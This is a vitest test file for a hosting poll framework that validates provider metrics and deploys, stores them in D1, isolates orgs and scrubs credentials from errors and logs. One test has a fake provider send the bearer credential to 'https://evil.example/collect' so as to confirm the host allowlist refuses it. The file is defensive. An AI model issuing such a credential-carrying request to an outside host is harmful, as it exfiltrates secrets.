/**
 * The hosting poll FRAMEWORK (src/hosting/poll.ts) — what runs a provider for one stored part and stores
 * what it returned. Every provider here is a FAKE handed in through the `providers` map, so nothing depends
 * on a real provider's implementation; its `poll` still goes through the real `hostFetch` (the allowlist,
 * no redirect) with a stubbed `fetchImpl`, and every row is asserted in real Miniflare D1.
 *
 * What matters: a provider is never trusted (bad points / deploys are dropped and counted, never stored),
 * points are first-write-wins while deploys upsert, the covered interval merges and restarts after a gap,
 * a part with no credential costs no request, and no failure lets a credential — or a piece of one — out.
 */
import { describe, it, expect, vi } from "vitest";
import { env } from "cloudflare:test";
import type { Env } from "../src/env";
import type { HostingPollOutcome } from "@shared/hosting";
import { all, first } from "./helpers/db";
import { LONG_TOKEN, leakedFragments } from "./helpers/repo";
import { setOrgEnvironments } from "./helpers/org-config";
import { ORG_A, ORG_B, bearerCtx, systemCtx, tenantCtx } from "./helpers/tenant";
import { ENVS } from "./helpers/repo";
import { setIntegrationConfig, setSecret } from "../src/data/secrets";
import { listStoredParts } from "../src/hosting/parts";
import { HostingError } from "../src/hosting/http";
import { mergeCovered, pollPart, runHostingPolls, validatePoll, type ProviderMap } from "../src/hosting/poll";
import { JobAccessError } from "../src/platform/jobs";
import type { HostingProvider, PollResult, ProviderContext } from "../src/hosting/types";

const e = env as unknown as Env;
const HOUR = 3_600_000;
const NOW = Date.parse("2026-09-20T12:40:00Z");
const h = (iso: string) => new Date(iso).toISOString();
const API = "https://api.vercel.test";

/** A fake provider: by default a web host on `api.vercel.test` that reads every web metric. */
function fake(poll: (pc: ProviderContext) => Promise<Partial<PollResult>>, over: Partial<HostingProvider> = {}): HostingProvider {
  return {
    id: "vercel", label: "Vercel", status: "available", summary: "", roles: ["web"], apiHosts: ["api.vercel.test"], docsUrl: "",
    credentialScope: "org", connectionMethods: [],
    orgConfigFields: [{ key: "team", label: "Team", description: "", required: false, pattern: /^[a-z-]+$/ }],
    partSettings: [{ key: "project_id", label: "Project ID", description: "", required: true, pattern: /^prj_[A-Za-z0-9]+$/ }],
    capabilities: { deploys: true, metrics: ["requests", "errors", "latency_p95_ms", "bandwidth_bytes"] }, planNote: null, pollCost: 2,
    consoleUrl: () => null,
    probe: async () => ({ ok: true, detail: "" }),
    poll: async (pc) => ({ deploys: [], points: [], unavailable: [], covered: null, ...(await poll(pc)) }),
    ...over,
  };
}

/** A fetch that records every request and answers 200 `{}`. */
function recorder(answer: (url: string) => Response = () => Response.json({})) {
  const calls: { url: string; auth: string | null }[] = [];
  const fetchImpl = (async (u: RequestInfo | URL, init?: RequestInit) => {
    calls.push({ url: String(u), auth: new Headers(init?.headers).get("authorization") });
    return answer(String(u));
  }) as typeof fetch;
  return { calls, fetchImpl };
}

async function addPart(orgId: string, envKey: string, key: string, provider: string, role: "web" | "service", settings: Record<string, string>, position = 0): Promise<void> {
  await env.DB.prepare(
    `INSERT INTO org_environment_parts (org_id, env_key, part_key, position, label, role, provider, settings, created_at, updated_at, updated_by)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, '2026-10-01T00:00:00.000Z', '2026-10-01T00:00:00.000Z', 'test')`,
  ).bind(orgId, envKey, key, position, key, role, provider, JSON.stringify(settings)).run();
}

/** SaplingLearn's two environments with ONE stored Vercel part on staging, and (by default) its credential. */
async function setup(o: { credential?: boolean } = {}) {
  await setOrgEnvironments(ENVS, ORG_A);
  await addPart(ORG_A, "staging", "web", "vercel", "web", { project_id: "prj_abc123" });
  if (o.credential !== false) {
    const admin = await tenantCtx("AndresL230");
    await setSecret(admin, "vercel", "", LONG_TOKEN);
    await setIntegrationConfig(admin, "vercel", "", { team: "acme" });
  }
  const [part] = await listStoredParts(systemCtx(ORG_A));
  return part;
}

const poll = async (provider: HostingProvider, now = NOW, fetchImpl: typeof fetch = recorder().fetchImpl): Promise<HostingPollOutcome> => {
  const [part] = await listStoredParts(systemCtx(ORG_A));
  return pollPart(e, systemCtx(ORG_A), part, now, fetchImpl, { vercel: provider } as ProviderMap);
};
const metrics = () => all<{ metric: string; env: string; part: string; at: string; value: number }>(env.DB,
  `SELECT metric, env, part, at, value FROM repo_metrics WHERE org_id = ? ORDER BY metric, at`, ORG_A);
const deploys = () => all<Record<string, unknown>>(env.DB,
  `SELECT deploy_id, state, target, sha, branch, message, actor, url, inspect_url, created_at, ready_at FROM hosting_deploys WHERE org_id = ? ORDER BY created_at`, ORG_A);
const state = () => first<Record<string, unknown>>(env.DB, `SELECT * FROM hosting_poll_state WHERE org_id = ? AND env = 'staging' AND part = 'web'`, ORG_A);
const secretRow = () => first<{ last_used_at: string | null; last_error: string | null }>(env.DB,
  `SELECT last_used_at, last_error FROM org_secrets WHERE org_id = ? AND kind = 'vercel' AND scope = ''`, ORG_A);

/** Runs `fn` with every console channel captured; returns what was logged, flattened. */
async function captured<T>(fn: () => Promise<T>): Promise<{ out: T; logged: string }> {
  const spies = (["error", "warn", "log", "info"] as const).map((k) => vi.spyOn(console, k).mockImplementation(() => undefined));
  try {
    const out = await fn();
    return { out, logged: JSON.stringify(spies.flatMap((s) => s.mock.calls)) };
  } finally { for (const s of spies) s.mockRestore(); }
}

describe("pollPart — a successful poll is stored", () => {
  it("stores the points as hx_* metrics, upserts the deploys, records the poll state and the credential's use", async () => {
    await setup();
    let seen: ProviderContext | null = null;
    const w = recorder();
    const provider = fake(async (pc) => {
      seen = pc;
      // Through the fixed-host fetch, as a real provider does — with the credential in the header.
      await pc.fetch(`${API}/v6/deployments`, { headers: { authorization: `Bearer ${pc.credential.secret.reveal()}` } });
      return {
        points: [
          { metric: "requests", at: h("2026-09-20T09:00:00Z"), value: 120 },
          { metric: "requests", at: h("2026-09-20T10:00:00Z"), value: 80 },
          { metric: "requests", at: h("2026-09-20T11:00:00Z"), value: 95 },
          { metric: "errors", at: h("2026-09-20T10:00:00Z"), value: 3 },
          { metric: "latency_p95_ms", at: h("2026-09-20T11:00:00Z"), value: 182.5 },
          { metric: "bandwidth_bytes", at: h("2026-09-20T11:00:00Z"), value: 5_000_000 },
        ],
        deploys: [
          { id: "dpl_1", state: "ready", target: "production", sha: "ABCDEF1234567", branch: "main", message: "ship it", by: "jose-a",
            createdAt: "2026-09-20T10:15:00Z", readyAt: "2026-09-20T10:17:30Z", url: "https://app-1.vercel.app", inspectUrl: "https://vercel.com/acme/app/1" },
          { id: "dpl_2", state: "building", target: null, sha: null, branch: "feat/x", message: null, by: null,
            createdAt: "2026-09-20T12:30:00Z", readyAt: null, url: null, inspectUrl: null },
        ],
        unavailable: [{ metric: "latency_p50_ms", reason: "needs the Pro plan" }],
        covered: { from: "2026-09-20T09:00:00Z", to: "2026-09-20T12:00:00Z" },
      };
    });
    const out = await poll(provider, NOW, w.fetchImpl);
    expect(out).toEqual({ env: "staging", part: "web", provider: "vercel", status: "ok", written: 8 });
    // The provider got the part's settings, the org's config and the decrypted credential — through the allowlisted fetch.
    expect(seen!.credential.config).toEqual({ team: "acme" });
    expect(w.calls).toEqual([{ url: `${API}/v6/deployments`, auth: `Bearer ${LONG_TOKEN}` }]);

    expect(await metrics()).toEqual([
      { metric: "hx_bandwidth_bytes", env: "staging", part: "web", at: "2026-09-20T11:00:00.000Z", value: 5_000_000 },
      { metric: "hx_errors", env: "staging", part: "web", at: "2026-09-20T10:00:00.000Z", value: 3 },
      { metric: "hx_latency_p95_ms", env: "staging", part: "web", at: "2026-09-20T11:00:00.000Z", value: 182.5 },
      { metric: "hx_requests", env: "staging", part: "web", at: "2026-09-20T09:00:00.000Z", value: 120 },
      { metric: "hx_requests", env: "staging", part: "web", at: "2026-09-20T10:00:00.000Z", value: 80 },
      { metric: "hx_requests", env: "staging", part: "web", at: "2026-09-20T11:00:00.000Z", value: 95 },
    ]);
    expect(await deploys()).toEqual([
      { deploy_id: "dpl_1", state: "ready", target: "production", sha: "abcdef1234567", branch: "main", message: "ship it", actor: "jose-a",
        url: "https://app-1.vercel.app/", inspect_url: "https://vercel.com/acme/app/1", created_at: "2026-09-20T10:15:00.000Z", ready_at: "2026-09-20T10:17:30.000Z" },
      { deploy_id: "dpl_2", state: "building", target: null, sha: null, branch: "feat/x", message: null, actor: null,
        url: null, inspect_url: null, created_at: "2026-09-20T12:30:00.000Z", ready_at: null },
    ]);
    expect(await state()).toMatchObject({
      provider: "vercel", status: "ok", polled_at: "2026-09-20T12:40:00.000Z", last_ok_at: "2026-09-20T12:40:00.000Z",
      covered_from: "2026-09-20T09:00:00.000Z", covered_to: "2026-09-20T12:00:00.000Z",
      detail: "6 new points, 2 new or changed deploys",
    });
    expect(JSON.parse(String((await state())!.unavailable))).toEqual([{ metric: "latency_p50_ms", reason: "needs the Pro plan" }]);
    expect(await secretRow()).toEqual({ last_used_at: "2026-09-20T12:40:00.000Z", last_error: null });
  });

  it("points are first-write-wins: a re-poll of a stored hour keeps the first value and writes nothing", async () => {
    await setup();
    const at = h("2026-09-20T10:00:00Z");
    expect((await poll(fake(async () => ({ points: [{ metric: "requests", at, value: 40 }] })))).written).toBe(1);
    const again = await poll(fake(async () => ({ points: [{ metric: "requests", at, value: 999 }] })));
    expect(again).toMatchObject({ status: "ok", written: 0 });
    expect((await metrics()).map((m) => m.value)).toEqual([40]);
  });

  it("a deploy's state moves by upsert — building → ready is ONE row, a settled re-poll writes nothing, a missing field is not erased", async () => {
    await setup();
    const d = { id: "dpl_9", target: "production" as const, sha: "1234567", branch: "main", message: "m", by: "a", createdAt: "2026-09-20T12:00:00Z", inspectUrl: "https://vercel.com/i/9" };
    expect((await poll(fake(async () => ({ deploys: [{ ...d, state: "building", readyAt: null, url: null }] })))).written).toBe(1);
    const ready = { ...d, state: "ready" as const, readyAt: "2026-09-20T12:03:00Z", url: "https://a.vercel.app" };
    expect((await poll(fake(async () => ({ deploys: [ready] })), NOW + 60_000)).written).toBe(1);
    expect((await poll(fake(async () => ({ deploys: [ready] })), NOW + 120_000)).written).toBe(0);
    // A later poll that no longer reports the URL or the message keeps them.
    expect((await poll(fake(async () => ({ deploys: [{ ...ready, url: null, message: null }] })), NOW + 180_000)).written).toBe(0);
    const rows = await deploys();
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ deploy_id: "dpl_9", state: "ready", ready_at: "2026-09-20T12:03:00.000Z", url: "https://a.vercel.app/", message: "m", created_at: "2026-09-20T12:00:00.000Z" });
  });
});

describe("pollPart — never trust a provider", () => {
  it("drops invalid points and deploys, stores the rest, and says what it dropped", async () => {
    await setup();
    const out = await poll(fake(async () => ({
      points: [
        { metric: "requests", at: h("2026-09-20T11:00:00Z"), value: 10 },                 // kept
        { metric: "requests", at: h("2026-09-20T12:00:00Z"), value: 10 },                 // the CURRENT hour — a short count would be permanent
        { metric: "requests", at: h("2026-09-20T15:00:00Z"), value: 10 },                 // the future
        { metric: "requests", at: h("2026-09-20T10:30:00Z"), value: 10 },                 // not an hour start
        { metric: "cpu", at: h("2026-09-20T10:00:00Z"), value: 0.5 },                     // a SERVICE metric on a web part
        { metric: "requests", at: h("2026-09-20T09:00:00Z"), value: -1 },                 // negative
        { metric: "errors", at: h("2026-09-20T09:00:00Z"), value: Number.NaN },           // NaN
        { metric: "errors", at: h("2026-09-20T10:00:00Z"), value: Number.POSITIVE_INFINITY },
        { metric: "latency_p95_ms", at: h("2026-09-20T10:00:00Z"), value: 5_000_000 },    // over the ceiling
        { metric: "visitors" as never, at: h("2026-09-20T10:00:00Z"), value: 1 },        // not in the vocabulary
        { metric: "errors", at: "yesterday", value: 1 },                                 // not an instant
        { metric: "requests", at: h("2026-09-20T11:00:00Z"), value: 77 },                 // a duplicate hour — the first wins
        { metric: "requests", at: h("2026-04-01T11:00:00Z"), value: 1 },                  // outside the 100-day retention
      ],
      deploys: [
        { id: "ok_1", state: "error", target: "staging" as never, sha: "not-a-sha", branch: "main\nmain", message: `line one ${LONG_TOKEN}\nline two`, by: "x",
          createdAt: "2026-09-20T11:00:00Z", readyAt: "garbage", url: "http://insecure.example", inspectUrl: `https://user:pw@vercel.com/x` },
        { id: "", state: "ready", target: null, sha: null, branch: null, message: null, by: null, createdAt: "2026-09-20T11:00:00Z", readyAt: null, url: null, inspectUrl: null },
        { id: "bad_state", state: "deleted" as never, target: null, sha: null, branch: null, message: null, by: null, createdAt: "2026-09-20T11:00:00Z", readyAt: null, url: null, inspectUrl: null },
        { id: "bad_time", state: "ready", target: null, sha: null, branch: null, message: null, by: null, createdAt: "not a date", readyAt: null, url: null, inspectUrl: null },
        { id: "x".repeat(201), state: "ready", target: null, sha: null, branch: null, message: null, by: null, createdAt: "2026-09-20T11:00:00Z", readyAt: null, url: null, inspectUrl: null },
        { id: "ok_1", state: "ready", target: null, sha: null, branch: null, message: null, by: null, createdAt: "2026-09-20T11:30:00Z", readyAt: null, url: null, inspectUrl: null },
        { id: "future", state: "ready", target: null, sha: null, branch: null, message: null, by: null, createdAt: "2026-09-22T11:00:00Z", readyAt: null, url: null, inspectUrl: null },
      ],
      unavailable: [{ metric: "cpu", reason: "a service metric" }, { metric: "requests", reason: "" }, { metric: "bandwidth_bytes", reason: "needs Analytics" }],
      covered: { from: "2026-09-20T11:00:00Z", to: "2026-09-20T09:00:00Z" },   // backwards — not an interval
    })));
    expect(out).toEqual({
      env: "staging", part: "web", provider: "vercel", status: "ok", written: 2,
      detail: "dropped as invalid: 12 points, 6 deploys, 2 unavailable notes",
    });
    expect((await metrics()).map((m) => [m.metric, m.at, m.value])).toEqual([["hx_requests", "2026-09-20T11:00:00.000Z", 10]]);
    // The one deploy that held is stored with every field that did NOT hold nulled — and its message scrubbed
    // BEFORE it was cut to its first line.
    expect(await deploys()).toEqual([{
      deploy_id: "ok_1", state: "error", target: null, sha: null, branch: null, message: "line one [redacted]", actor: "x",
      url: null, inspect_url: null, created_at: "2026-09-20T11:00:00.000Z", ready_at: null,
    }]);
    const st = (await state())!;
    expect([st.covered_from, st.covered_to]).toEqual([null, null]);
    expect(JSON.parse(String(st.unavailable))).toEqual([{ metric: "bandwidth_bytes", reason: "needs Analytics" }]);
    expect(st.detail).toBe("1 new point, 1 new or changed deploy; dropped as invalid: 12 points, 6 deploys, 2 unavailable notes");
  });

  it("validatePoll is pure and keeps at most 50 deploys — the newest", () => {
    const deploys = Array.from({ length: 60 }, (_, i) => ({
      id: `d${i}`, state: "ready", target: null, sha: null, branch: null, message: null, by: null,
      createdAt: new Date(NOW - (60 - i) * 60_000).toISOString(), readyAt: null, url: null, inspectUrl: null,
    }));
    const clean = validatePoll({ deploys, points: "not a list", covered: { from: "2026-09-20T08:30:00Z", to: "2026-09-20T14:00:00Z" } }, { env: "staging", key: "web", role: "web" }, NOW);
    expect(clean.deploys).toHaveLength(50);
    expect(clean.deploys[0].id).toBe("d59");
    expect(clean.dropped).toEqual({ points: 0, deploys: 10, unavailable: 0 });
    // Snapped INWARD, its end clamped to the current hour.
    expect(clean.covered).toEqual({ from: Date.parse("2026-09-20T09:00:00Z"), to: Date.parse("2026-09-20T12:00:00Z") });
    expect(validatePoll(null, { env: "s", key: "w", role: "service" }, NOW)).toEqual({ points: [], deploys: [], unavailable: [], covered: null, dropped: { points: 0, deploys: 0, unavailable: 0 } });
  });
});

describe("pollPart — the covered interval", () => {
  it("mergeCovered: overlapping or touching windows join, a window after a gap restarts, an older one leaves the interval standing", () => {
    const iv = (a: string, b: string) => ({ from: Date.parse(`2026-09-20T${a}:00:00Z`), to: Date.parse(`2026-09-20T${b}:00:00Z`) });
    expect(mergeCovered(null, iv("09", "12"))).toEqual(iv("09", "12"));
    expect(mergeCovered(iv("09", "12"), null)).toEqual(iv("09", "12"));
    expect(mergeCovered(iv("09", "12"), iv("10", "13"))).toEqual(iv("09", "13"));
    expect(mergeCovered(iv("09", "12"), iv("12", "15"))).toEqual(iv("09", "15"));   // touching
    expect(mergeCovered(iv("09", "12"), iv("08", "10"))).toEqual(iv("08", "12"));   // reaches back — joins
    expect(mergeCovered(iv("09", "12"), iv("10", "11"))).toEqual(iv("09", "12"));   // inside — nothing moves backwards
    expect(mergeCovered(iv("09", "12"), iv("14", "17"))).toEqual(iv("14", "17"));   // a GAP: restart
    expect(mergeCovered(iv("14", "17"), iv("09", "12"))).toEqual(iv("14", "17"));   // an older window apart: kept
  });

  it("successive polls extend it, a gap restarts it, a failed poll keeps it, and a re-pointed part starts over", async () => {
    await setup();
    const covering = (from: string, to: string) => fake(async () => ({ covered: { from, to } }));
    const covered = async () => { const s = (await state())!; return [s.covered_from, s.covered_to]; };
    await poll(covering("2026-09-20T09:00:00Z", "2026-09-20T12:00:00Z"));
    await poll(covering("2026-09-20T10:00:00Z", "2026-09-20T13:00:00Z"), NOW + HOUR);
    expect(await covered()).toEqual(["2026-09-20T09:00:00.000Z", "2026-09-20T13:00:00.000Z"]);
    // Polls stopped for four hours: the next window does not reach the interval — it restarts there.
    await poll(covering("2026-09-20T17:00:00Z", "2026-09-20T20:00:00Z"), NOW + 8 * HOUR);
    expect(await covered()).toEqual(["2026-09-20T17:00:00.000Z", "2026-09-20T20:00:00.000Z"]);
    // A failed poll changes the status, never the interval or the last success.
    await captured(() => poll(fake(async () => { throw new HostingError("vercel 503"); }), NOW + 9 * HOUR));
    const failed = (await state())!;
    expect(failed).toMatchObject({ status: "failed", detail: "vercel 503", covered_from: "2026-09-20T17:00:00.000Z", last_ok_at: "2026-09-20T20:40:00.000Z" });
    // The part re-pointed to another provider: the old provider's history is not the new one's.
    await env.DB.prepare(`UPDATE org_environment_parts SET provider = 'render', settings = '{}' WHERE org_id = ? AND part_key = 'web'`).bind(ORG_A).run();
    await setSecret(await tenantCtx("AndresL230"), "render", "", `rnd_${LONG_TOKEN}`);
    const [part] = await listStoredParts(systemCtx(ORG_A));
    const render = fake(async () => ({ covered: { from: "2026-09-20T19:00:00Z", to: "2026-09-20T22:00:00Z" } }), { id: "render", label: "Render", partSettings: [] });
    await pollPart(e, systemCtx(ORG_A), part, NOW + 10 * HOUR, recorder().fetchImpl, { render });
    expect(await state()).toMatchObject({ provider: "render", status: "ok", covered_from: "2026-09-20T19:00:00.000Z", covered_to: "2026-09-20T22:00:00.000Z" });
  });
});

describe("pollPart — skipped before any request", () => {
  it("no credential for the provider: `skipped` — the fetch is never called, the provider never asked", async () => {
    await setup({ credential: false });
    const w = recorder();
    const polled = vi.fn(async () => ({}));
    const out = await poll(fake(polled), NOW, w.fetchImpl);
    expect(out).toEqual({ env: "staging", part: "web", provider: "vercel", status: "skipped", written: 0, detail: "not connected" });
    expect(polled).not.toHaveBeenCalled();
    expect(w.calls).toEqual([]);
    expect(await state()).toMatchObject({ status: "skipped", detail: "not connected", last_ok_at: null, covered_from: null });
  });

  it("a provider that is not available, or a required setting missing / malformed: skipped, naming the field, never the value", async () => {
    await setup();
    const polled = vi.fn(async () => ({}));
    expect(await poll(fake(polled, { status: "later" }))).toMatchObject({ status: "skipped", detail: "not supported yet" });
    // No provider in the map at all reads the same.
    const [part] = await listStoredParts(systemCtx(ORG_A));
    expect(await pollPart(e, systemCtx(ORG_A), part, NOW, recorder().fetchImpl, {})).toMatchObject({ status: "skipped", detail: "not supported yet" });
    await env.DB.prepare(`UPDATE org_environment_parts SET settings = '{"project_id":"oops value"}' WHERE org_id = ?`).bind(ORG_A).run();
    expect(await poll(fake(polled))).toMatchObject({ status: "skipped", detail: "Project ID is not in the expected form" });
    await env.DB.prepare(`UPDATE org_environment_parts SET settings = '{}' WHERE org_id = ?`).bind(ORG_A).run();
    expect(await poll(fake(polled))).toMatchObject({ status: "skipped", detail: "Project ID is not set" });
    // A REQUIRED org-wide setting the org has not filled.
    await env.DB.prepare(`UPDATE org_environment_parts SET settings = '{"project_id":"prj_x"}' WHERE org_id = ?`).bind(ORG_A).run();
    const needsTeam = fake(polled, { orgConfigFields: [{ key: "team_id", label: "Team ID", description: "", required: true }] });
    expect(await poll(needsTeam)).toMatchObject({ status: "skipped", detail: "Team ID is not set" });
    expect(polled).not.toHaveBeenCalled();
    // A skip uses no credential: nothing recorded on the integration row.
    expect(await secretRow()).toEqual({ last_used_at: null, last_error: null });
  });

  it("a legacy part is the usage job's — never polled here, no state written", async () => {
    await setOrgEnvironments(ENVS, ORG_A);
    const [legacy] = (await import("../src/hosting/parts")).legacyParts({
      key: "staging", label: "staging", branch: "main", position: 0, railway_env: "", worker: "frontend-staging", worker_check: "",
      railway_environment_id: null, railway_service_id: null, updated_at: "", updated_by: "",
    });
    expect(await pollPart(e, systemCtx(ORG_A), legacy, NOW)).toMatchObject({ status: "skipped", detail: "polled by the hourly usage job" });
    expect(await all(env.DB, `SELECT 1 FROM hosting_poll_state`)).toEqual([]);
  });
});

describe("pollPart — a failure never lets the credential out", () => {
  it("a provider error quoting the token is scrubbed in the outcome, the poll state, last_error and every log line", async () => {
    await setup();
    const careless = fake(async (pc) => {
      // A provider that forgot to scrub: the upstream echoed the Authorization header back.
      throw new HostingError(`vercel deployments 401: invalid token Bearer ${pc.credential.secret.reveal()} for team acme`);
    });
    const { out, logged } = await captured(() => poll(careless));
    expect(out.status).toBe("failed");
    expect(out.detail).toBe("vercel deployments 401: invalid token Bearer [redacted] for team acme");
    const st = (await state())!;
    const row = (await secretRow())!;
    for (const text of [JSON.stringify(out), String(st.detail), String(row.last_error), logged]) {
      expect(leakedFragments(text, LONG_TOKEN)).toEqual([]);
    }
    expect(row.last_error).toBe("vercel deployments 401: invalid token Bearer [redacted] for team acme");
    expect(logged).toContain("hosting poll");
    expect(logged).toContain("org=org_saplinglearn");
  });

  it("anything that is not a HostingError becomes fixed text — a thrown fetch or a parse error may quote PART of a request", async () => {
    await setup();
    const { out, logged } = await captured(() => poll(fake(async (pc) => {
      throw new TypeError(`fetch failed: ${pc.credential.secret.reveal().slice(0, 30)}`);
    })));
    expect(out).toMatchObject({ status: "failed", detail: "vercel: the request failed" });
    expect(leakedFragments(logged, LONG_TOKEN)).toEqual([]);
    expect(leakedFragments(String((await secretRow())!.last_error), LONG_TOKEN)).toEqual([]);
  });

  it("the allowlist: a provider fetching a host that is not its own is refused BEFORE anything is sent", async () => {
    await setup();
    const w = recorder();
    const { out } = await captured(() => poll(fake(async (pc) => {
      await pc.fetch("https://evil.example/collect", { headers: { authorization: `Bearer ${pc.credential.secret.reveal()}` } });
      return {};
    }), NOW, w.fetchImpl));
    expect(out).toMatchObject({ status: "failed", detail: "refused to send the credential: evil.example is not one of the provider's API hosts" });
    expect(w.calls).toEqual([]);
  });
});

describe("runHostingPolls — one org's stored parts, as that org", () => {
  it("not_configured with no stored part (an org on the legacy parts alone included); a bearer context is refused", async () => {
    await setOrgEnvironments(ENVS, ORG_A); // legacy Cloudflare + Railway parts, no stored one
    expect(await runHostingPolls(e, systemCtx(ORG_A), NOW, recorder().fetchImpl, {})).toBe("not_configured");
    await expect(runHostingPolls(e, await bearerCtx("AndresL230"), NOW)).rejects.toBeInstanceOf(JobAccessError);
  });

  it("polls every stored part of ITS org with ITS credential, in part order; another org's parts are never touched", async () => {
    await setOrgEnvironments(ENVS, ORG_A);
    await setOrgEnvironments(ENVS, ORG_B);
    await addPart(ORG_A, "staging", "web", "vercel", "web", { project_id: "prj_a1" });
    await addPart(ORG_A, "production", "web", "vercel", "web", { project_id: "prj_a2" });
    await addPart(ORG_B, "staging", "web", "vercel", "web", { project_id: "prj_b1" });
    await setSecret(await tenantCtx("AndresL230"), "vercel", "", `a_${LONG_TOKEN}`);
    await setSecret(await tenantCtx("bob", "admin", { orgId: ORG_B }), "vercel", "", `b_${LONG_TOKEN}`);
    const asked: string[] = [];
    const w = recorder();
    const provider = fake(async (pc) => {
      await pc.fetch(`${API}/x`, { headers: { authorization: `Bearer ${pc.credential.secret.reveal()}` } });
      asked.push(pc.credential.secret.reveal().slice(0, 2));
      return { points: [{ metric: "requests", at: h("2026-09-20T11:00:00Z"), value: 1 }] };
    });
    const out = await runHostingPolls(e, systemCtx(ORG_A), NOW, w.fetchImpl, { vercel: provider });
    expect(out).toEqual([
      { env: "staging", part: "web", provider: "vercel", status: "ok", written: 1 },
      { env: "production", part: "web", provider: "vercel", status: "ok", written: 1 },
    ]);
    expect(asked).toEqual(["a_", "a_"]);
    expect(await all(env.DB, `SELECT DISTINCT org_id FROM repo_metrics`)).toEqual([{ org_id: ORG_A }]);
    expect(await all(env.DB, `SELECT org_id FROM hosting_poll_state WHERE org_id = ?`, ORG_B)).toEqual([]);
  });
});
